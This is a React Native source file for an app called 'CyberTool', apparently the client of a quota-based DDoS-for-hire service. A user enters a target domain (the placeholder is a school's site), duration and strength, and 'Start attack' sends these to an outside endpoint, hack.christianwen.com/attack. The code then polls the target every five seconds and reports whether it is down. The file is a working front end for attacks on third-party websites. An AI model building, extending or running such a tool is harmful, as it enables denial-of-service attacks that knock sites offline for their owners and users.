import React from 'react';
import { Text, View, Slider, ActivityIndicator, TouchableWithoutFeedback } from 'react-native';
import { Container, Item, Input, Label, Content, Form, Button, Header, Body, Title, Toast, Root, Card, CardItem, Right, Left, ActionSheet } from 'native-base';
import { Auth } from 'aws-amplify';
import axios from 'axios';
import styles from './styles';
const cancelTokenSource = axios.CancelToken.source();

const ENDPOINT = 'https://hack.christianwen.com';

export default class App extends React.Component {
  constructor(props){
    super(props);
    this.state = {
      strength: 10,
      duration: 20,
      isAttacking: false,
      idToken: null
    }
  }

  async componentDidMount(){
    const currentSession = await Auth.currentSession();
    const { idToken: { jwtToken } } = currentSession;
    const username = this.props.screenProps.username;
    this.setState(prevState => ({
      ...prevState,
      idToken: jwtToken,
      username: username
    }))
  }

  quotaActionSheet = () => () => {
    ActionSheet.show(
      {  
        options: ['Get free quota', 'Cancel'],
        cancelButtonIndex: 1,
        title: "Quota"
      },
      buttonIndex => {
        if(buttonIndex==0){
          axios.get(`${ENDPOINT}/quota?username=${this.props.screenProps.username}&type=get_free_quota`)
            .then(({data}) => {
              if(data.success){
                alert('Reset free quota to 600 seconds');
                /*this.setState(prevState => ({
                  ...prevState,
                  quota: {
                    ...prevState.quota,
                    free_quota: 600
                  }
                }))*/
                this.props.screenProps.resetQuota({free_quota: 600})
              } else alert(data.error);
            }).catch(error => console.log(error))
          
        }
      }
    )
  }
  

  onChangeText = key => newValue => {
    this.setState(prevState => ({
      ...prevState,
      [key]: newValue
    }))
  }

  toggleAttackingMode(){
    this.setState(prevState => ({
      ...prevState,
      isAttacking: !prevState.isAttacking
    }))
  }

  startAttack = () => {
    const { target, duration, strength, idToken } = this.state;
    const { screenProps: { resetQuota, used_quota } } = this.props;
    const url = `${ENDPOINT}/attack?target=${target}&duration=${duration || 20}&strength=${strength || 10}&id_token=${idToken}`;
    this.toggleAttackingMode();
    let responseData;
    axios.get(url)
      .then(response => {
        this.toggleAttackingMode();
        console.log(response.data);
        //respnseData = responseData;
      })
      .catch(error => console.log(error));
    
    let result;
    const interval = setInterval(async function(){
      result = await checkSiteStatus(target);
      console.log(result);
      let type, text, buttonText = 'Okay';
      if(result.status == 'down'){
        text = `${target} is down!`;
      } else text = `${target} is still live after 5 seconds`;
      type = result.status == 'down' ? 'danger' : 'success';
      
      Toast.show({
        text, buttonText, type
      })  
    }, 5000);
    setTimeout(() => {
      clearInterval(interval);
      /*this.setState(prevState => ({
        ...prevState,
        result,
        used_quota: prevState.used_quota + duration
      }))*/
      this.props.screenProps.resetQuota();
    }, duration*1000);
  }

  change = key => value => {
    this.setState(prevState => ({
      ...prevState,
      [key]: parseFloat(value)
    }));
  }

  render() {
    const { strength, duration } = this.state;
    const { screenProps: { quota } } = this.props;
    return (
      <Root>
      <Container>
        <Header>
          <Left style = {{marginLeft: 10}}>
            <Title>CyberTool</Title>
          </Left>
          <Right>
            <TouchableWithoutFeedback
              onPress = {this.quotaActionSheet()}
            >
              <Title>{quota.free_quota + quota.paid_quota }s</Title>
            </TouchableWithoutFeedback>
          </Right>
        
        </Header>
        <Content>
          <Form>
            <Item fixedLabel>
              <Label>Target</Label>
              <Input 
                onChangeText={this.onChangeText('target')}
                placeholder={'hn-ams.edu.vn'}
                placeholderTextColor={'#bdbdbd'}
              />
            </Item>
            <Item fixedLabel>
              <Label>Duration ({duration})</Label>
              <View style={styles.container}>
                <Slider
                  step={10}
                  maximumValue={200}
                  minimumValue={20}
                  onValueChange={this.change('duration')}
                  value={duration}
                />
              </View>
            </Item>
            <Item fixedLabel>
              <Label>Strength ({strength})</Label>
              <View style={styles.container}>
                <Slider
                  step={5}
                  maximumValue={100}
                  minimumValue={10}
                  onValueChange={this.change('strength')}
                  value={strength}
                />
              </View>
            </Item>
          </Form>
          
          <View style = {{ flex: 1, alignItems: 'center', justifyContent: 'center', margin: 20 }}>
            {!this.state.isAttacking &&
            <Button 
              bordered 
              dark
              onPress={this.startAttack}
              style={styles.startAttackButton}
            >
              <Text>Start attack</Text>
            </Button>
            }
            {this.state.isAttacking &&
            <ActivityIndicator size="large" color="#000" />
            }
          </View>
          {(!this.state.isAttacking && this.state.result) &&
          <Card style={styles.resultCard}>
            <CardItem header bordered>
              <Text style = {{fontWeight: 'bold'}}>Result</Text>
            </CardItem>
            <CardItem bordered>
              <Body>
                <Text>
                  {renderResultMessage(this.state.result)}
                </Text>
              </Body>
            </CardItem>
          </Card>
          }
        </Content>

        
      </Container>
      </Root>
    );
  }
}

const checkSiteStatus = async url => {
  if(!url.startsWith('http://') && !url.startsWith('https://'))url = `http://${url}`;
  const timeout = setTimeout(() => {
    cancelTokenSource.cancel('No response after 10 seconds')
  }, 10000);
  try {
    const response = await axios.get(url, {
      cancelToken: cancelTokenSource.token
    })
    //console.log(response.data);
    clearTimeout(timeout);
    return { status: 'live' }
  } catch(error) {
    if(axios.isCancel(error)) {
      console.log('request cancelled', error.message);
    } else {
      clearTimeout(timeout);
      console.log(error);
    }

    return { status: 'down' }
  }
}

const renderResultMessage = result => {
  let message;
  if(result.status == 'down'){
    message = 'The site is down.'
  } else message = 'The site is still live';
  return message;
}